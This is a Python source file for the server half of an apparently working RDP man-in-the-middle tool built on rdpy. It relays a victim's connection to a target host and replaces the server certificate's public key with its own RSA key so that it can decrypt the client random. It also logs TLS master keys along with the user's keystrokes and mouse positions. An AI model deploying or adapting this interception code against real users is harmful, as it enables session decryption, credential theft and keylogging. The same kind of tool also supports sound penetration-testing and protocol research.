from Crypto.PublicKey import RSA

from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from rdpy.core import log
from rdpy.core.crypto import SecuritySettings
from rdpy.enum.rdp import NegotiationProtocols, RDPDataPDUSubtype, InputEventType
from rdpy.layer.mcs import MCSLayer
from rdpy.layer.rdp.data import RDPDataLayer
from rdpy.layer.rdp.licensing import RDPLicensingLayer
from rdpy.layer.rdp.security import chooseSecurityHeader, RDPSecurityLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer
from rdpy.layer.x224 import X224Layer
from rdpy.mitm.client import MITMClient
from rdpy.mitm.observer import MITMChannelObserver
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp.client_info import RDPClientInfoParser
from rdpy.parser.rdp.connection import RDPClientConnectionParser, RDPServerConnectionParser
from rdpy.parser.rdp.negotiation import RDPNegotiationParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSAttachUserConfirmPDU, MCSChannelJoinConfirmPDU, MCSConnectResponsePDU
from rdpy.pdu.rdp.connection import ProprietaryCertificate, ServerSecurityData, RDPServerDataPDU
from rdpy.pdu.rdp.negotiation import RDPNegotiationResponsePDU
from rdpy.protocol.mcs.channel import MCSChannelFactory, MCSServerChannel
from rdpy.protocol.mcs.server import MCSServerRouter
from rdpy.protocol.mcs.user import MCSUser, MCSUserObserver
from rdpy.protocol.rdp.x224 import ServerTLSContext


class MITMServerRouter(MCSServerRouter):
    def __init__(self, server, mcs, factory):
        MCSServerRouter.__init__(self, mcs, factory, None)
        self.server = server

    def onAttachUserRequest(self, pdu):
        self.server.onAttachUserRequest(pdu)

    def attachSuccessful(self, userID):
        user = MCSUser(self, self.factory)
        user.onAttachConfirmed(userID)
        self.users[userID] = user
        self.mcs.send(MCSAttachUserConfirmPDU(0, userID))

    def attachFailed(self):
        self.mcs.send(MCSAttachUserConfirmPDU(1, 0))

    def onChannelJoinRequest(self, pdu):
        self.server.onChannelJoinRequest(pdu)

    def channelJoinAccepted(self, userID, channelID):
        self.users[userID].channelJoined(self.mcs, channelID)
        self.mcs.send(MCSChannelJoinConfirmPDU(0, userID, channelID, channelID, ""))


class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName):
        MCSUserObserver.__init__(self)
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.client = None
        self.negotiationPDU = None
        self.serverData = None
        self.licensing = None
        self.io = RDPDataLayer()
        self.securityLayer = None
        self.rc4RSAKey = RSA.generate(2048)
        self.settings = SecuritySettings(SecuritySettings.Mode.SERVER)

        self.use_tls = False
        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.tcp.createObserver(onConnection=self.onConnection)
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest)

        self.router = MITMServerRouter(self, self.mcs, self)
        self.router.createObserver(onConnectionReceived = self.onConnectInitial)
        self.mcs.setObserver(self.router)

        self.ioSecurityLayer = None
        self.licensingLayer = RDPLicensingLayer()
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.gcc = GCCParser()
        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()
        self.rdpNegotiationParser = RDPNegotiationParser()

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.negotiationPDU

    # Build protocol for the client side of the connection
    def buildProtocol(self, addr):
        self.client = MITMClient(self)
        return self.client.getProtocol()

    def logSSLParameters(self):
        log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                  self.tpkt.previous.transport.protocol._tlsConnection.master_key())

    def log_debug(self, string):
        log.debug("Server: %s" % string)

    def log_error(self, string):
        log.error("Server: %s" % string)

    # Connect the client side to the target machine
    def connectClient(self):
        reactor.connectTCP(self.targetHost, self.targetPort, self)

    # Connection sequence #0
    def onConnection(self):
        self.log_debug("TCP connected")

    # X224 Request
    def onConnectionRequest(self, pdu):
        self.log_debug("Connection Request received")
        self.negotiationPDU = self.rdpNegotiationParser.parse(pdu.payload)
        self.connectClient()

    # X224 Response
    def onConnectionConfirm(self, pdu):
        protocols = NegotiationProtocols.SSL if self.negotiationPDU.tlsSupported else NegotiationProtocols.NONE
        payload = self.rdpNegotiationParser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.negotiationPDU.tlsSupported:
            self.tpkt.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.use_tls = True

    # MCS Connect Initial
    def onConnectInitial(self, pdu):
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        self.log_debug("Connect Initial received")

        if self.use_tls:
            self.logSSLParameters()

        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    # MCS Connect Response
    def onConnectResponse(self, pdu, serverData):
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        cert = ProprietaryCertificate(
            cert.signatureAlgorithmID,
            cert.keyAlgorithmID,
            cert.publicKeyType,
            self.rc4RSAKey,
            cert.signatureType,
            cert.signature,
            cert.padding
        )

        security = ServerSecurityData(
            serverData.security.encryptionMethod,
            serverData.security.encryptionLevel,
            serverData.security.serverRandom,
            cert
        )
        self.settings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    # MCS Attach User Request
    def onAttachUserRequest(self, _):
        self.client.onAttachUserRequest()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.router.attachSuccessful(user.userID)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user):
        self.router.attachFailed()

    # MCS Channel Join Request
    def onChannelJoinRequest(self, pdu):
        self.client.onChannelJoinRequest(pdu)

    # MCS Channel Join Confirm
    def onChannelJoinConfirm(self, userID, channelID):
        self.router.channelJoinAccepted(userID, channelID)


    def buildChannel(self, mcs, userID, channelID):
        self.log_debug("building channel {} for user {}".format(channelID, userID))

        headerType = chooseSecurityHeader(self.serverData.security.encryptionMethod, self.use_tls)

        if channelID == self.serverData.network.mcsChannelID:
            self.securityLayer = RDPSecurityLayer(headerType, None)
            self.licensing = self.securityLayer.licensing
            channel = MCSServerChannel(mcs, userID, channelID)

            channel.setNext(self.securityLayer)
            self.securityLayer.setNext(self.io)

            self.securityLayer.createObserver(
                onClientInfoReceived = self.onClientInfoReceived,
                onSecurityExchangeReceived = self.onSecurityExchangeReceived
            )

            observer = MITMChannelObserver(self.io, "Server")
            clientObserver = self.client.getChannelObserver(channelID)

            observer.setPeer(clientObserver)
            clientObserver.setPeer(observer)

            self.io.setObserver(observer)
            observer.setDataHandler(RDPDataPDUSubtype.PDUTYPE2_INPUT, self.onInputPDUReceived)

            return channel

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        self.log_debug("Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.settings.setClientRandom(clientRandom)
        self.securityLayer.crypter = self.settings.getCrypter()

    # Client Info Packet
    def onClientInfoReceived(self, pdu):
        self.log_debug("Client Info received")
        self.client.onClientInfoReceived(pdu)

    def onLicensingPDU(self, pdu):
        self.licensing.sendPDU(pdu)

    def sendDisconnectProviderUltimatum(self, pdu):
        self.mcs.send(pdu)

    def onInputPDUReceived(self, pdu):
        for event in pdu.events:
            if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
                self.log_debug("Key pressed: 0x%2lx" % event.keyCode)
            elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
                self.log_debug("Mouse position: x = %d, y = %d" % (event.x, event.y))